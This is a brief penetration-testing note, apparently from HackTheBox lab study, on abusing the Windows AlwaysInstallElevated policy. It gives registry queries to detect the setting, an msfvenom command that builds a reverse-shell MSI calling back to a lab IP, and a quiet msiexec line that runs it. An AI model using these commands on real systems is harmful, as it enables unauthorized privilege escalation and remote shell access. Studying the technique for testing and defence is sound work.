---
tags: [privesc, windows, misconfiguration]
aliases: [Always Install Elevated]
---

# Always Install Elevated

A setting set via Local Group Policy under the following paths
- `Computer Configuration\Administrative Templates\Windows Components\Windows Installer`
- `User Configuration\Administrative Templates\Windows Components\Windows Installer`

We can enumerate this setting
```powershell
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

We can thereforce exploit by generating a malicious MSI package and execute via it the command line.

```shell
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi

# execute the msi package
msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
```

## Related

- [[other|Other Privesc]]
- [[windows-old]]
- [[pillaging]]
- [[groups|Windows Groups]]

